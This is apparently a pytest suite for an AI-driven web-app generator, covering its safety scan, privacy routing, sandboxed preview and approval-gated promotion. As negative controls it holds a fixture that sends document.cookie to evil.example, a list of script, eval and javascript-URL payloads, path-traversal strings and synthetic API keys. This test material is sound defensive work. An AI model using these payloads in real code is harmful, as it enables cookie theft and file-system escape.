"""Vibe Studio end to end against FAKE models (no network, no GPU).

Covers: queue/resume/cancel/STOP, the provider ladder, privacy (local_only and
what a cloud payload may contain), the static safety scan with negative
controls, confined writes, versions/diff/rollback, sandboxed preview headers and
owner-approved promotion into the apps list.
"""
from __future__ import annotations

import asyncio
import json
from pathlib import Path

import pytest

from bcc import long_run
from bcc.providers import ChatResult, ProviderError
from bcc.vibe import VibeService
from bcc.vibe.generator import Candidate, Ladder, SYSTEM_PROMPT, parse_output
from bcc.vibe.safety import (UnsafePath, inline_for_preview, preview_csp, safe_rel_path, scan_files,
                             secret_findings, valid_slug)

from .conftest import wait_for

GOOD_HTML = '<!doctype html><html><head><meta charset="utf-8"><title>t</title>' \
            '<link rel="stylesheet" href="style.css"></head><body><h1 id="h">Hello</h1>' \
            '<script src="app.js"></script></body></html>'


def reply(files: dict[str, str], plan: str = "- tiny app\n- index.html") -> str:
    out = ["<<<PLAN>>>", plan]
    for name, body in files.items():
        out += [f"<<<FILE {name}>>>", body]
    out.append("<<<END>>>")
    return "\n".join(out)


GOOD = reply({"index.html": GOOD_HTML, "style.css": "body{margin:0;color:#222}",
              "app.js": "document.getElementById('h').textContent = 'Counter';"})
GOOD_V2 = reply({"index.html": GOOD_HTML, "style.css": "body{margin:0;color:#c00}",
                 "app.js": "document.getElementById('h').textContent = 'Counter v2';"})
EVIL_FETCH = reply({"index.html": GOOD_HTML, "style.css": "body{}",
                    "app.js": "fetch('https://evil.example/steal?d=' + document.cookie);"})


class FakeAdapter:
    def __init__(self, answers=None, *, error: Exception | None = None, hold: asyncio.Event | None = None,
                 tokens=(100, 200)):
        self.answers = list(answers or [GOOD])
        self.error, self.hold, self.tokens = error, hold, tokens
        self.calls: list[list[dict]] = []

    async def chat(self, model, messages, **kw):
        self.calls.append(messages)
        if self.hold is not None:
            await self.hold.wait()
        if self.error is not None:
            raise self.error
        text = self.answers[min(len(self.calls) - 1, len(self.answers) - 1)]
        return ChatResult(text=text, tokens_in=self.tokens[0], tokens_out=self.tokens[1], model=model)


class FakeLadder(Ladder):
    def __init__(self, *cands: Candidate):
        self.cands = list(cands)

    async def candidates(self, *, local_only: bool):
        return [c for c in self.cands if c.is_local or not local_only]


def cand(tier: str, adapter: FakeAdapter, name: str | None = None) -> Candidate:
    return Candidate(tier=tier, label=f"{name or tier}-model ({tier})", adapter=adapter,
                     model=name or f"{tier}-model", family="glm" if tier == "paid" else "")


@pytest.fixture
def autonomy(tmp_path, monkeypatch):
    root = tmp_path / "autonomy"
    monkeypatch.setenv("BOSSMAN_AUTONOMY_ROOT", str(root))
    return root


def make_service(env, ladder, **kw) -> VibeService:
    svc = VibeService(env.settings.data_dir, ladder=ladder, stop_check=long_run.stop_reason,
                      approvals=env.svc.approvals, call_timeout=5, **kw)
    env.svc.vibe = svc
    return svc


async def post_job(env, **over):
    body = {"request": "a counter with plus and minus buttons", "title": "Counter", **over}
    return await env.client.post("/api/vibe/jobs", json=body)


async def finish(env, job_id, timeout=8):
    async def check():
        j = (await env.client.get(f"/api/vibe/jobs/{job_id}")).json()
        return j if j["status"] in ("completed", "failed", "cancelled", "stopped") else None
    return await wait_for(check, timeout=timeout)


async def events(env, job_id):
    return (await env.client.get(f"/api/vibe/jobs/{job_id}/events")).json()["events"]


def apps_root(env) -> Path:
    return Path(env.settings.data_dir) / "vibe" / "apps"


# ----------------------------------------------------------------- happy path
async def test_build_writes_only_under_version_dir_and_streams_steps(env, autonomy):
    svc = make_service(env, FakeLadder(cand("local", FakeAdapter())))
    r = await post_job(env)
    assert r.status_code == 202
    job = await finish(env, r.json()["job_id"])
    assert job["status"] == "completed", job
    slug = job["result"]["slug"]
    v1 = apps_root(env) / slug / "v1"
    assert sorted(p.name for p in v1.iterdir()) == ["app.js", "index.html", "style.css"]
    # nothing else was written under the apps tree
    assert {p.relative_to(apps_root(env)).parts[0] for p in apps_root(env).rglob("*")} == {slug}
    kinds = [e["kind"] for e in await events(env, job["job_id"])]
    for needed in ("queued", "planning", "ladder", "generating", "model_reply", "plan",
                   "file_written", "check_passed", "completed"):
        assert needed in kinds, kinds
    assert kinds.index("planning") < kinds.index("generating") < kinds.index("file_written") \
        < kinds.index("check_passed") < kinds.index("completed")
    # cursor polling returns only new events
    after = (await events(env, job["job_id"]))[2]["n"]
    later = (await env.client.get(f"/api/vibe/jobs/{job['job_id']}/events?after={after}")).json()["events"]
    assert later and all(e["n"] > after for e in later)
    await svc.close()


async def test_preview_is_one_document_with_strict_csp_and_no_external_fetch(env, autonomy):
    make_service(env, FakeLadder(cand("local", FakeAdapter())))
    job = await finish(env, (await post_job(env)).json()["job_id"])
    slug = job["result"]["slug"]
    r = await env.client.get(f"/api/vibe/apps/{slug}/versions/1/preview")
    assert r.status_code == 200
    csp = r.headers["content-security-policy"]
    assert "default-src 'none'" in csp and "connect-src 'none'" in csp and "form-action 'none'" in csp
    assert "frame-ancestors 'self'" in csp and "'unsafe-eval'" not in csp
    assert r.headers["x-content-type-options"] == "nosniff"
    body = r.text
    assert "Counter';" in body and 'src="app.js"' not in body and "<style>" in body   # inlined


# ----------------------------------------------------------------- negative controls
async def test_generated_fetch_to_foreign_host_is_rejected_and_nothing_is_written(env, autonomy):
    ad = FakeAdapter([EVIL_FETCH])
    make_service(env, FakeLadder(cand("local", ad)))
    job = await finish(env, (await post_job(env)).json()["job_id"])
    assert job["status"] == "failed" and job["error"]["code"] == "generation_failed"
    assert "evil.example" in json.dumps(await events(env, job["job_id"]))
    assert not apps_root(env).exists() or not any(apps_root(env).rglob("*.js"))
    assert len(ad.calls) == 2                              # initial + one repair, then give up
    assert "REJECTED by the safety scan" in ad.calls[1][1]["content"]


async def test_repair_round_fixes_a_rejected_first_answer(env, autonomy):
    ad = FakeAdapter([EVIL_FETCH, GOOD])
    make_service(env, FakeLadder(cand("local", ad)))
    job = await finish(env, (await post_job(env)).json()["job_id"])
    assert job["status"] == "completed" and len(ad.calls) == 2
    kinds = [e["kind"] for e in await events(env, job["job_id"])]
    assert "check_failed" in kinds and "check_passed" in kinds


async def test_path_traversal_slug_and_file_names_are_rejected(env, autonomy):
    make_service(env, FakeLadder(cand("local", FakeAdapter())))
    for slug in ("../evil", "..\\evil", "a/b", "C:\\x", "con", "", "-x", "x-", "A" * 50):
        r = await post_job(env, slug=slug) if slug else None
        if r is not None:
            assert r.status_code == 422, (slug, r.text)
    # a model answer that tries to climb out of the version dir is a parse failure, not a write
    ad = FakeAdapter([reply({"index.html": GOOD_HTML, "../escape.js": "x"})])
    make_service(env, FakeLadder(cand("local", ad)))
    job = await finish(env, (await post_job(env)).json()["job_id"])
    assert job["status"] == "failed"
    data = Path(env.settings.data_dir)
    assert not list(data.rglob("escape.js")) and not (data / "vibe" / "escape.js").exists()
    for bad in ("../x.js", "/etc/passwd", "a\\b.js", "x/y/z.js", ".hidden.js", "app.exe", "nul.js", "a:b.js"):
        with pytest.raises(UnsafePath):
            safe_rel_path(bad)
    with pytest.raises(UnsafePath):
        valid_slug("../x")


@pytest.mark.parametrize("name,files", [
    ("eval", {"app.js": "eval(location.hash)"}),
    ("function ctor", {"app.js": "new Function('return 1')()"}),
    ("string timer", {"app.js": "setTimeout('alert(1)', 10)"}),
    ("websocket", {"app.js": "new WebSocket('wss://x.example')"}),
    ("dynamic import", {"app.js": "import('./x.js')"}),
    ("nonliteral fetch", {"app.js": "const u = location.hash.slice(1); fetch(u)"}),
    ("bracket global", {"app.js": "window['fe' + 'tch']('/x')"}),
    ("sendBeacon", {"app.js": "navigator.sendBeacon('/x', 'a')"}),
    ("parent access", {"app.js": "parent.document.body.innerHTML = ''"}),
    ("script src cdn", {"index.html": '<html><script src="https://cdn.example/x.js"></script></html>'}),
    ("protocol relative", {"index.html": '<html><img src="//evil.example/p.png"></html>'}),
    ("css import", {"style.css": "@import url('https://fonts.example/f.css');"}),
    ("css url", {"style.css": "body{background:url(//evil.example/a.png)}"}),
    ("iframe", {"index.html": "<html><iframe src='about:blank'></iframe></html>"}),
    ("form action", {"index.html": '<html><form action="https://evil.example/s"></form></html>'}),
    ("meta refresh", {"index.html": '<html><meta http-equiv="refresh" content="0;url=x"></html>'}),
    ("secret key stored", {"app.js": "localStorage.setItem('api_key', v)"}),
    ("hardcoded key", {"app.js": "const k = 'sk-abcdefghijklmnopqrstuvwxyz012345';"}),  # ci-secret-scan: allow — deliberate synthetic secret-detection canary
    ("cookie write", {"app.js": "document.cookie = 'a=b'"}),
    ("javascript url", {"index.html": '<html><a href="javascript:alert(1)">x</a></html>'}),
    ("local path", {"app.js": "// C:\\Users\\asd\\Bossman\\secrets"}),
    ("worker", {"app.js": "new Worker('w.js')"}),
])
def test_scan_rejects(name, files):
    base = {"index.html": "<html><body>ok</body></html>"}
    rep = scan_files({**base, **files})
    assert rep.ok is False and rep.errors, name


def test_scan_accepts_a_plain_app_and_honours_an_explicit_allowlist():
    files = {"index.html": GOOD_HTML, "style.css": "body{margin:0}",
             "app.js": "const el=document.getElementById('h'); el.textContent='x'; "
                       "localStorage.setItem('items', JSON.stringify([]));"}
    assert scan_files(files).ok
    svgish = {"index.html": '<html><body><svg xmlns="http://www.w3.org/2000/svg"></svg></body></html>'}
    assert scan_files(svgish).ok
    web = {"index.html": GOOD_HTML, "app.js": "fetch('https://api.example.org/x').then(r=>r.json())"}
    assert not scan_files(web).ok
    assert scan_files(web, allowlist=["api.example.org"]).ok
    assert "connect-src https://api.example.org" in preview_csp(["api.example.org"])


def test_limits_and_secret_detection():
    big = {"index.html": "x" * (300 * 1024)}
    assert not scan_files(big).ok
    many = {f"f{i}.js": "1" for i in range(25)} | {"index.html": "ok"}
    assert not scan_files(many).ok
    assert secret_findings("use key sk-or-v1-abcdef0123456789abcdef") and not secret_findings("a red counter")  # ci-secret-scan: allow — deliberate synthetic secret-detection canary
    assert parse_output(GOOD).files["index.html"].startswith("<!doctype html>")
    html = inline_for_preview({"index.html": GOOD_HTML, "app.js": "var a=1;", "style.css": "p{}"})
    assert "<script>var a=1;" in html and "<style>p{}</style>" in html


async def test_wait_idle_timeout_leaves_the_queue_worker_running(tmp_path):
    svc = VibeService(tmp_path, ladder=FakeLadder())
    release = asyncio.Event()
    svc._worker = asyncio.ensure_future(release.wait())
    with pytest.raises(asyncio.TimeoutError):
        await svc.wait_idle(timeout=0.05)
    assert not svc._worker.cancelled() and not svc._worker.done()   # the wait gave up, the worker did not
    release.set()
    await svc.wait_idle(timeout=1)
    assert svc._worker.done() and not svc._worker.cancelled()


async def test_wait_idle_reports_a_failed_worker_instead_of_hiding_it(tmp_path):
    svc = VibeService(tmp_path, ladder=FakeLadder())

    async def boom():
        await asyncio.sleep(0)
        raise RuntimeError("queue crashed")
    svc._worker = asyncio.ensure_future(boom())
    with pytest.raises(RuntimeError, match="queue crashed"):
        await svc.wait_idle(timeout=1)


def test_inline_preview_escapes_closing_tags_inside_inlined_bodies():
    # a literal "</script" / "</style" inside an inlined file would end the tag early in the preview frame
    html = inline_for_preview({"index.html": GOOD_HTML, "app.js": "var s='</script>';", "style.css": "p{content:'</style>'}"})
    assert "var s='<\\/script>';" in html and "</script>';" not in html
    assert "p{content:'<\\/style>'}" in html
    # negative control: ordinary bodies are not altered
    plain = inline_for_preview({"index.html": GOOD_HTML, "app.js": "var a=1;", "style.css": "p{}"})
    assert "\\/" not in plain


# ----------------------------------------------------------------- ladder, privacy
async def test_ladder_falls_back_local_then_free_and_never_touches_paid_when_free_works(env, autonomy):
    local = FakeAdapter(error=ProviderError("connection refused", kind="network"))
    free = FakeAdapter([GOOD])
    paid = FakeAdapter([GOOD])
    make_service(env, FakeLadder(cand("local", local), cand("free", free), cand("paid", paid)))
    job = await finish(env, (await post_job(env)).json()["job_id"])
    assert job["status"] == "completed" and job["result"]["tier"] == "free"
    assert len(local.calls) == 1 and len(free.calls) == 1 and paid.calls == []


async def test_local_only_never_calls_cloud_and_fails_when_no_local_model(env, autonomy):
    cloud = FakeAdapter([GOOD])
    make_service(env, FakeLadder(cand("free", cloud), cand("paid", cloud)))
    job = await finish(env, (await post_job(env, privacy="local_only")).json()["job_id"])
    assert job["status"] == "failed" and job["error"]["code"] == "no_model"
    assert cloud.calls == []
    r = await post_job(env, privacy="whatever")
    assert r.status_code == 422


async def test_secret_like_request_text_keeps_the_job_off_the_cloud(env, autonomy):
    cloud, local = FakeAdapter([GOOD]), FakeAdapter([GOOD])
    make_service(env, FakeLadder(cand("local", local), cand("free", cloud)))
    r = await post_job(env, request="a notes app; my key is sk-abcdefghijklmnopqrstuvwxyz0123456789")  # ci-secret-scan: allow — deliberate synthetic secret-detection canary
    job = await finish(env, r.json()["job_id"])
    assert job["status"] == "completed" and job["result"]["tier"] == "local"
    assert cloud.calls == []
    assert any(e["kind"] == "privacy" for e in await events(env, job["job_id"]))


async def test_cloud_payload_is_system_prompt_plus_request_only_not_previous_code(env, autonomy):
    local = FakeAdapter([GOOD])
    make_service(env, FakeLadder(cand("local", local)))
    first = await finish(env, (await post_job(env)).json()["job_id"])
    slug = first["result"]["slug"]
    # canary inside the stored v1 code must never reach a cloud rung on modify
    v1 = apps_root(env) / slug / "v1" / "app.js"
    v1.write_text(v1.read_text() + "\n// CANARY_PRIVATE_CODE_7731\n", encoding="utf-8")
    cloud = FakeAdapter([GOOD_V2])
    make_service(env, FakeLadder(cand("free", cloud)))
    job = await finish(env, (await post_job(env, slug=slug, request="make the heading red")).json()["job_id"])
    assert job["status"] == "completed" and job["kind"] == "modify"
    sent = cloud.calls[0]
    assert len(sent) == 2 and sent[0]["content"] == SYSTEM_PROMPT
    blob = json.dumps(sent)
    assert "CANARY_PRIVATE_CODE_7731" not in blob and "<<<FILE" not in sent[1]["content"]
    assert "make the heading red" in blob and "a counter with plus and minus buttons" in blob
    # a LOCAL rung does get the current code on modify
    local2 = FakeAdapter([GOOD_V2])
    make_service(env, FakeLadder(cand("local", local2)))
    await finish(env, (await post_job(env, slug=slug, request="again", base_version=1)).json()["job_id"])
    assert "CANARY_PRIVATE_CODE_7731" in local2.calls[0][1]["content"]


# ----------------------------------------------------------------- lifecycle
async def test_cancel_in_flight(env, autonomy):
    gate = asyncio.Event()
    ad = FakeAdapter([GOOD], hold=gate)
    make_service(env, FakeLadder(cand("local", ad)))
    jid = (await post_job(env)).json()["job_id"]
    await wait_for(lambda: _nonempty(ad.calls))
    r = await env.client.post(f"/api/vibe/jobs/{jid}/cancel")
    assert r.status_code == 200
    job = await finish(env, jid)
    assert job["status"] == "cancelled"
    assert (await env.client.post(f"/api/vibe/jobs/{jid}/cancel")).status_code == 409


async def _nonempty(x):
    return bool(x)


async def test_stop_file_blocks_start_and_halts_in_flight_job(env, autonomy):
    long_run.request_stop("test stop")
    ad = FakeAdapter([GOOD])
    svc = make_service(env, FakeLadder(cand("local", ad)))
    jid = (await post_job(env)).json()["job_id"]
    await asyncio.sleep(0.2)
    assert (await env.client.get(f"/api/vibe/jobs/{jid}")).json()["status"] == "queued" and ad.calls == []
    st = (await env.client.get("/api/vibe/status")).json()
    assert st["stop"] and "STOP" in st["stop"]
    assert long_run.clear_stop() is True
    svc.kick()
    job = await finish(env, jid)
    assert job["status"] == "completed"

    # STOP arriving while the model is thinking: halted at the next step boundary, nothing written
    gate = asyncio.Event()
    ad2 = FakeAdapter([GOOD], hold=gate)
    make_service(env, FakeLadder(cand("local", ad2)))
    jid2 = (await post_job(env, title="Second")).json()["job_id"]
    await wait_for(lambda: _nonempty(ad2.calls))
    long_run.request_stop("mid-run")
    gate.set()
    job2 = await finish(env, jid2)
    assert job2["status"] == "stopped", job2
    assert not (apps_root(env) / job2["slug"]).exists()
    long_run.clear_stop()


async def test_live_job_is_requeued_after_restart_and_completes(env, autonomy):
    svc = make_service(env, FakeLadder(cand("local", FakeAdapter([GOOD]))))
    job = svc.create({"request": "a timer", "title": "Timer"})
    await svc.close()
    await asyncio.sleep(0)
    # simulate a crash mid-generation: the process died with the job live
    cur = svc.store.load_job(job["job_id"])
    cur["status"] = "generating"
    svc.store.save_job(cur)
    fresh = make_service(env, FakeLadder(cand("local", FakeAdapter([GOOD]))))
    assert await fresh.resume() == 1
    done = await finish(env, job["job_id"])
    assert done["status"] == "completed" and done["resumes"] == 1
    assert any(e["kind"] == "resumed" for e in await events(env, job["job_id"]))


async def test_versions_diff_rollback_keep_every_version(env, autonomy):
    make_service(env, FakeLadder(cand("local", FakeAdapter([GOOD, GOOD_V2]))))
    j1 = await finish(env, (await post_job(env)).json()["job_id"])
    slug = j1["result"]["slug"]
    j2 = await finish(env, (await post_job(env, slug=slug, request="make it red")).json()["job_id"])
    assert j2["result"]["version"] == 2
    meta = (await env.client.get(f"/api/vibe/apps/{slug}")).json()
    assert meta["current"] == 2 and [v["n"] for v in meta["versions"]] == [1, 2]
    d = (await env.client.get(f"/api/vibe/apps/{slug}/diff?from=1&to=2")).json()
    assert {f["path"] for f in d["files"]} == {"app.js", "style.css"}
    assert "+document.getElementById('h').textContent = 'Counter v2';" in next(
        f["diff"] for f in d["files"] if f["path"] == "app.js")
    rb = await env.client.post(f"/api/vibe/apps/{slug}/rollback", json={"version": 1})
    assert rb.json()["current"] == 1
    assert (apps_root(env) / slug / "v2" / "index.html").is_file()           # nothing deleted
    assert (await env.client.post(f"/api/vibe/apps/{slug}/rollback", json={"version": 9})).status_code == 404
    assert (await env.client.get(f"/api/vibe/apps/{slug}/versions/7/preview")).status_code == 404


async def test_preview_refuses_a_version_tampered_with_on_disk(env, autonomy):
    make_service(env, FakeLadder(cand("local", FakeAdapter())))
    job = await finish(env, (await post_job(env)).json()["job_id"])
    slug = job["result"]["slug"]
    js = apps_root(env) / slug / "v1" / "app.js"
    js.write_text("fetch('https://evil.example/x')", encoding="utf-8")
    r = await env.client.get(f"/api/vibe/apps/{slug}/versions/1/preview")
    assert r.status_code == 409


# ----------------------------------------------------------------- promotion
async def test_promotion_needs_an_explicit_owner_approval(env, autonomy):
    make_service(env, FakeLadder(cand("local", FakeAdapter())))
    job = await finish(env, (await post_job(env)).json()["job_id"])
    slug = job["result"]["slug"]
    req = (await env.client.post(f"/api/vibe/apps/{slug}/promote", json={"version": 1})).json()
    assert req["status"] == "pending"
    again = (await env.client.post(f"/api/vibe/apps/{slug}/promote/finish")).json()
    assert again["status"] == "pending"
    promoted_dir = Path(env.settings.data_dir) / "vibe" / "promoted" / slug
    assert not promoted_dir.exists()                                  # nothing before the owner decides
    apps_before = (await env.client.get("/api/apps")).json()
    assert not any(str(a.get("id", "")).startswith("vibe-") for a in _cards(apps_before))
    d = await env.client.post(f"/api/approvals/{req['approval_id']}", json={"approve": True, "by": "owner"})
    assert d.status_code == 200
    done = (await env.client.post(f"/api/vibe/apps/{slug}/promote/finish")).json()
    assert done["status"] == "promoted"
    assert (promoted_dir / "app.manifest.yaml").is_file() and (promoted_dir / "site" / "index.html").is_file()
    page = await env.client.get(f"/api/vibe/promoted/{slug}/")
    assert page.status_code == 200 and "connect-src 'none'" in page.headers["content-security-policy"]
    from bcc.features import apps as apps_feature
    cards = _cards((await env.client.get("/api/apps?refresh=1")).json())
    mine = [a for a in cards if a.get("id") == f"vibe-{slug}"]
    assert mine and mine[0]["status"] == "LIVE" and mine[0]["static_url"].endswith(f"/{slug}/")
    assert apps_feature._cache is not None


async def test_rejected_promotion_stays_out(env, autonomy):
    make_service(env, FakeLadder(cand("local", FakeAdapter())))
    job = await finish(env, (await post_job(env)).json()["job_id"])
    slug = job["result"]["slug"]
    req = (await env.client.post(f"/api/vibe/apps/{slug}/promote", json={"version": 1})).json()
    await env.client.post(f"/api/approvals/{req['approval_id']}", json={"approve": False, "by": "owner"})
    r = await env.client.post(f"/api/vibe/apps/{slug}/promote/finish")
    assert r.status_code == 409
    assert not (Path(env.settings.data_dir) / "vibe" / "promoted" / slug).exists()


def _cards(payload):
    if isinstance(payload, dict):
        for key in ("apps", "items", "cards"):
            if isinstance(payload.get(key), list):
                return payload[key]
    return payload if isinstance(payload, list) else []


# ----------------------------------------------------------------- real registry ladder + governance
async def test_registry_ladder_orders_tiers_and_gates_paid_by_the_long_run_profile(env, autonomy, monkeypatch):
    from bcc.vibe.generator import RegistryLadder
    reg = env.svc.registry
    monkeypatch.delenv("BOSSMAN_ALLOW_PAID_CLOUD", raising=False)       # product default
    used: list[str] = []

    class Echo:
        def __init__(self, tag):
            self.tag = tag

        async def chat(self, model, messages, **kw):
            used.append(self.tag)
            return ChatResult(text=GOOD, tokens_in=10, tokens_out=10, model=model)

        async def health(self):
            raise NotImplementedError

    reg.adapter_factory = lambda model, provider: Echo(model["name"])
    local = await reg.create_provider("llama", "openai_compat", "http://127.0.0.1:8081/v1")
    orp = await reg.create_provider("openrouter", "openai_compat", "https://openrouter.ai/api/v1", "k")
    mis = await reg.create_provider("mistral", "openai_compat", "https://api.mistral.ai/v1", "k")
    await reg.create_model(provider_id=local["id"], name="qwen3-coder", kind="local", status="online")
    await reg.create_model(provider_id=orp["id"], name="nvidia/nemotron-3-ultra-550b-a55b:free", kind="cloud",
                           price_in=0.0, price_out=0.0, status="online")
    await reg.create_model(provider_id=orp["id"], name="z-ai/glm-5.3-flash", kind="cloud",
                           price_in=0.075, price_out=0.25, status="online")
    await reg.create_model(provider_id=orp["id"], name="anthropic/claude-haiku-5.5", kind="cloud",
                           price_in=1.0, price_out=5.0, status="online")
    await reg.create_model(provider_id=mis["id"], name="mistral-large-4", kind="cloud",
                           price_in=2.0, price_out=6.0, status="online")
    await reg.create_model(provider_id=orp["id"], name="openai/gpt-5", kind="cloud",
                           price_in=5.0, price_out=15.0, status="online")
    ladder = RegistryLadder(reg)

    off = [(c.tier, c.model) for c in await ladder.candidates(local_only=False)]
    assert off == [("local", "qwen3-coder"), ("free", "nvidia/nemotron-3-ultra-550b-a55b:free")]

    long_run.write_profile(enable=True)
    on = [(c.tier, c.model) for c in await ladder.candidates(local_only=False)]
    assert on == [("local", "qwen3-coder"), ("free", "nvidia/nemotron-3-ultra-550b-a55b:free"),
                  ("paid", "z-ai/glm-5.3-flash"), ("paid", "anthropic/claude-haiku-5.5"),
                  ("paid", "mistral-large-4")]                      # gpt-5 is never offered
    only_local = [c.model for c in await ladder.candidates(local_only=True)]
    assert only_local == ["qwen3-coder"]

    # a paid rung really goes through GovernedAdapter + the ledger
    paid = next(c for c in await ladder.candidates(local_only=False) if c.family == "glm")
    await paid.adapter.chat(paid.model, [{"role": "user", "content": "hi"}], max_tokens=50)
    assert used == ["z-ai/glm-5.3-flash"]
    assert long_run.LongRunLedger().report()["providers"]["glm"]["calls"] == 1
